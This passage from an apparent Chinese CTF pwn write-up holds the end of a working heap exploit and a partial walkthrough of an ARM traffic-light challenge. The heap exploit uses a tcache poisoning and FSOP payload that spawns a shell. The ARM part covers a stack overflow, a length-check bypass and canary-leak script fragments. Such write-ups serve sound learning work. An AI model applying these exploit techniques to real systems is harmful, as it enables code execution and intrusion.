class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>)          <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)          <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)          <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)             <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">2</span>)             <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>,p64(<span class="number">0</span>))   <span class="comment"># clean fd&amp;bk  0</span></span><br><span class="line">delete(<span class="number">6</span>)             <span class="comment"># 6</span></span><br><span class="line">delete(<span class="number">5</span>)             <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x4F8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x490</span>) <span class="comment"># 5&amp;6合并大堆块的前0x4F8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x3B8</span>)         <span class="comment"># 5&amp;6合并大堆块的后0x3B8</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x418</span>)         <span class="comment"># 3</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)             <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x108</span>, <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x100</span> + p64(<span class="number">0x550</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Show at index 6:\n&quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x21ACE0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base is ==&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delete(<span class="number">6</span>)           <span class="comment"># 3 0x418</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Show at index 9:&quot;</span>)</span><br><span class="line">leak_info = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_info))</span><br><span class="line">heap_base = (leak_info - <span class="number">0xa</span>) * <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">f&#x27;heap_base is ==&gt; <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x3F0</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">heap = (heap_base + <span class="number">0x1050</span>) &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">stdout = libc.address + <span class="number">0x21B780</span></span><br><span class="line">fd = stdout ^ heap</span><br><span class="line">edit(<span class="number">6</span>, p64(fd))</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x00</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">        <span class="number">0x08</span>: stdout - <span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0x28</span>: libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line">        <span class="number">0x88</span>: libc.sym[<span class="string">&quot;_environ&quot;</span>] - <span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0xA0</span>: stdout - <span class="number">0x40</span>,</span><br><span class="line">        <span class="number">0xD8</span>: libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>] - <span class="number">0x20</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-012.png"></p>
+<p>中间写的时候绕进去了，晃了很久，这类题目确实该练一练了。</p>
+<hr>
+<h2 id="singal："><a href="#singal：" class="headerlink" title="singal："></a>singal：</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-013.png"></p>
+<p>一个 32 位的 arm 架构，复习一下动态调试的方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :1234          <span class="comment"># 查看当前占用进程</span></span><br><span class="line"><span class="built_in">kill</span> -9 PID            <span class="comment"># 占用就停掉进程</span></span><br></pre></td></tr></table></figure>
+
+<p>启动 qemu-arm：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1234 -L ./ ./cli_patched</span><br></pre></td></tr></table></figure>
+
+<p>然后 gdb 动调即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./cli_patched</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-014.png"></p>
+<p>和 mips 一样要先加载，然后就可以了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture arm</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-015.png"></p>
+<hr>
+<h3 id="IDA-静态分析："><a href="#IDA-静态分析：" class="headerlink" title="IDA 静态分析："></a>IDA 静态分析：</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-016.png"></p>
+<p>IDA 没有给出 main 函数，两个方法找到 main 函数：</p>
+<ol>
+<li>直接运行程序，查找运行过程中出现的字符串然后找交叉引用：</li>
+</ol>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-017.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-018.png"></p>
+<p>然后直接就定位到 main 函数了：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-019.png"></p>
+<ol start="2">
+<li>方法二是笨方法，像这种本来就没多少函数的二进制程序，自己找一找看一眼就能找出来个大概</li>
+</ol>
+<p>找到了 main 函数，那就进行程序分析：</p>
+<h4 id="分析-main-函数："><a href="#分析-main-函数：" class="headerlink" title="分析 main 函数："></a>分析 main 函数：</h4><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-020.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>创建了一个标准的 IPv4 TCP 套接字，并将返回的文件描述符（<code>sockfd</code>）保存到全局变量 <code>dword_1302C</code> 中</p>
+<p>IPv4 会有这么一个结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="type">sa_family_t</span>    sin_family; <span class="comment">// 2 字节，地址族</span></span><br><span class="line">    <span class="type">in_port_t</span>      sin_port;   <span class="comment">// 2 字节，端口号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">// 4 字节，IPv4 地址</span></span><br><span class="line">    <span class="type">char</span>           sin_zero[<span class="number">8</span>];<span class="comment">// 8 字节填充</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">或者这样</span></span><br><span class="line"><span class="comment">struct sockaddr &#123;</span></span><br><span class="line"><span class="comment">    sa_family_t sa_family; // 2 字节</span></span><br><span class="line"><span class="comment">    char        sa_data[14]; // 14 字节（包含端口和 IP）</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>因此初步操作就是为了改连接 ip 和端口：127.0.0.1:8000</p>
+<p>pthread_create 会创建一个新线程，去调用 sub_BAC：</p>
+<h5 id="sub-BAC"><a href="#sub-BAC" class="headerlink" title="sub_BAC"></a>sub_BAC</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_BAC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [sp+Ch] [bp-30h] BYREF</span></span><br><span class="line">    _DWORD v1[<span class="number">5</span>]; <span class="comment">// [sp+18h] [bp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, <span class="string">&quot;signal\n&quot;</span>);</span><br><span class="line">        buf[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">        buf[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">        send(dword_1302C, buf, <span class="number">0xAu</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">        <span class="keyword">if</span> ( recv(dword_1302C, v1, <span class="number">0x14u</span>, <span class="number">0</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            pthread_mutex_lock(&amp;stru_13014);</span><br><span class="line">            _isoc99_sscanf(v1, <span class="string">&quot;%d %d&quot;</span>, &amp;dword_13008, &amp;dword_1300C);</span><br><span class="line">            pthread_mutex_unlock(&amp;stru_13014);</span><br><span class="line">        &#125;</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>dword_1302C 正好是一开始创建的 IPV4TCP 协议，向服务器发送 <code>0xA</code>（10）个字节的数据，内容为 <code>&quot;signal\n\0\0&quot;</code>，然后可以接受 0x14 个字节的内存</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L ./ ./cli_patched</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-021.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8000 -s 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-022.png"></p>
+<p>它会接收你输入的数据。继续往下看吧：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-023.png"></p>
+<h5 id="sub-123C："><a href="#sub-123C：" class="headerlink" title="sub_123C："></a>sub_123C：</h5><p>这个函数会调用我们刚才输入的内容：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-024.png"></p>
+<p>这个函数比较抽象，非常长，但是实际呢，就那么个意思：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sig1:</span><br><span class="line">1 = RED / STOP</span><br><span class="line">2 = GREEN / GO</span><br><span class="line">3 = YELLOW / CAUTION</span><br><span class="line"></span><br><span class="line">sig2:</span><br><span class="line">4 = WALK</span><br><span class="line">5 = DON<span class="string">&#x27;T WALK</span></span><br></pre></td></tr></table></figure>
+
+<p>回到 main 函数，看一看菜单：</p>
+<h5 id="case1："><a href="#case1：" class="headerlink" title="case1："></a>case1：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_DF0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">    <span class="type">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">    <span class="type">int</span> sig1; <span class="comment">// [sp+Ch] [bp-58h]</span></span><br><span class="line">    <span class="type">char</span> v6[<span class="number">4</span>]; <span class="comment">// [sp+14h] [bp-50h] BYREF</span></span><br><span class="line">    _BYTE s[<span class="number">60</span>]; <span class="comment">// [sp+18h] [bp-4Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">    *(_DWORD *)v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    pthread_mutex_lock(&amp;stru_13014);</span><br><span class="line">    sig1 = ::sig1;</span><br><span class="line">    pthread_mutex_unlock(&amp;stru_13014);</span><br><span class="line">    <span class="keyword">if</span> ( sig1 == <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;32mThe current traffic light is green, and vehicles can pass through\n\x1B[0m&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sig1 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;31mThe current red light prevents the vehicle from moving forward\n\x1B[0m&quot;</span>);</span><br><span class="line">    v2 = rand();</span><br><span class="line">    v3 = v2 &amp; <span class="number">1</span>;                                  <span class="comment">// 0或1</span></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )</span><br><span class="line">        v3 = -v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;                                             <span class="comment">// v3 = 1</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You are about to run a red light, the surveillance system will take photos to record it!&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, (<span class="type">void</span> *)(a1 + <span class="number">1</span>), <span class="number">0x34u</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(v6, <span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)(a1 + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;your record msg: %s\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;                                             <span class="comment">// v3 = 0</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[1;33mCurrently yellow light, car waiting \n\x1B[0m&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            pthread_mutex_lock(&amp;stru_13014);</span><br><span class="line">            <span class="keyword">if</span> ( ::sig1 == <span class="number">2</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            pthread_mutex_unlock(&amp;stru_13014);</span><br><span class="line">            sleep(<span class="number">1u</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;waiting 1s...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_mutex_unlock(&amp;stru_13014);</span><br><span class="line">        <span class="keyword">return</span> sub_DF0(a1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码看起来很长，但是逻辑其实十分简单：</p>
+<p>假如 v3 &#x3D; 1，就会进入：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;You are about to run a red light, the surveillance system will take photos to record it!&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, (<span class="type">void</span> *)(a1 + <span class="number">1</span>), <span class="number">0x34u</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(v6, <span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)(a1 + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;your record msg: %s\n&quot;</span>, v6);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v6[<span class="number">4</span>]; <span class="comment">// [sp+14h] [bp-50h] BYREF</span></span><br><span class="line">_BYTE s[<span class="number">60</span>]; <span class="comment">// [sp+18h] [bp-4Ch] BYREF</span></span><br></pre></td></tr></table></figure>
+
+<p>read 会先写 0x34 个字节的内容到<code>(void *)(a1 + 1)</code>，由于 sprintf 的特性，会把内容先写到 v6，再打印</p>
+<p>这就导致这 0x34 的字节在<code>char v6[4];</code>上会存在栈溢出</p>
+<h4 id="case2："><a href="#case2：" class="headerlink" title="case2："></a>case2：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_101C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// r0</span></span><br><span class="line">  _WORD nbytes[<span class="number">3</span>]; <span class="comment">// [sp+6h] [bp-46h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [sp+Ch] [bp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  nbytes[<span class="number">0</span>] = <span class="number">12320</span>;</span><br><span class="line">  pthread_mutex_lock(&amp;stru_13014);</span><br><span class="line">  *(_DWORD *)&amp;nbytes[<span class="number">1</span>] = sig2;</span><br><span class="line">  result = pthread_mutex_unlock(&amp;stru_13014);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)&amp;nbytes[<span class="number">1</span>] == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;32mThe current pedestrian light is green, and pedestrians can pass through\n\x1B[0m&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)&amp;nbytes[<span class="number">1</span>] == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;32mThe current pedestrian light is red, pedestrians need to wait for a while\n\x1B[0m&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pthread_mutex_lock(&amp;stru_13014);</span><br><span class="line">      <span class="keyword">if</span> ( sig2 == <span class="number">4</span> &amp;&amp; sig1 == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      pthread_mutex_unlock(&amp;stru_13014);</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;waiting 1s...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_unlock(&amp;stru_13014);</span><br><span class="line">    sub_101C();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How long do you need to walk: &quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, nbytes);</span><br><span class="line">    result = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( HIBYTE(nbytes[<span class="number">0</span>]) &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)LOBYTE(nbytes[<span class="number">0</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;registration information:&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> read(<span class="number">0</span>, buf, LOBYTE(nbytes[<span class="number">0</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里控制 sig2 &#x3D; 5 就可以进入到关键 if：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pthread_mutex_unlock(&amp;stru_13014);</span><br><span class="line">sub_101C();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;How long do you need to walk: &quot;</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, nbytes);</span><br><span class="line">result = getchar();</span><br><span class="line"><span class="keyword">if</span> ( HIBYTE(nbytes[<span class="number">0</span>]) &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)LOBYTE(nbytes[<span class="number">0</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;registration information:&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, LOBYTE(nbytes[<span class="number">0</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以输入 nbytes 的值，假如 <code>HIBYTE(nbytes[0])&gt;=LOBYTE(nbytes[0])</code>，就会 <code>read(0, buf, LOBYTE(nbytes[0]))</code>，如果我们控制 nbytes 是 0xffffffff，那么我们就可以输入 0xffff 个字节大小的数据，从而进行堆 buf 的栈溢出，修改返回地址写一个 ret2shellcode。</p>
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><h4 id="过随机数"><a href="#过随机数" class="headerlink" title="过随机数"></a>过随机数</h4><p>那么首先我们想要保证，我们可以通过控制 sig2 达到越界读的效果，那么我们就可以利用多次触发 sig2 去泄露 canary 和 libc_base。在触发 sig2 的时候有条件，在 sig1 的判断中有一个或 0 或 1 的随机数，我们尝试去重复申请，不通过就重新尝试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_light</span>(<span class="params">light</span>):</span><br><span class="line">    s.recvuntil(<span class="string">b&quot;signal\n&quot;</span>)</span><br><span class="line">    s.sendline(light)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_menu</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;target: &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_record</span>():</span><br><span class="line">    recv_menu()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        set_light(<span class="string">b&quot;3 5&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        data = r.recvuntil((record_msg, wait_msg), timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> record_msg <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        set_light(<span class="string">b&quot;2 5&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> r.recvuntil(<span class="string">b&quot;target: &quot;</span>, timeout=<span class="number">8</span>):</span><br><span class="line">            log.failure(<span class="string">&quot;stuck in waiting, rerun exploit&quot;</span>)</span><br><span class="line">            <span class="keyword">raise</span> SystemExit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-025.png"></p>
+<p>要求假如我们可以进入 v3，那就 return，假如随机数没有通过，那就输入 sig1 &#x3D; 2 制造 break 重新生成随机数</p>
+<h4 id="泄露-canary："><a href="#泄露-canary：" class="headerlink" title="泄露 canary："></a>泄露 canary：</h4><p>我们知道 nbytes 是写到栈上的，那么我们就可以利用栈去寻找 canary</p>
+<!-- 这是一张图片，ocr 内容为： -->
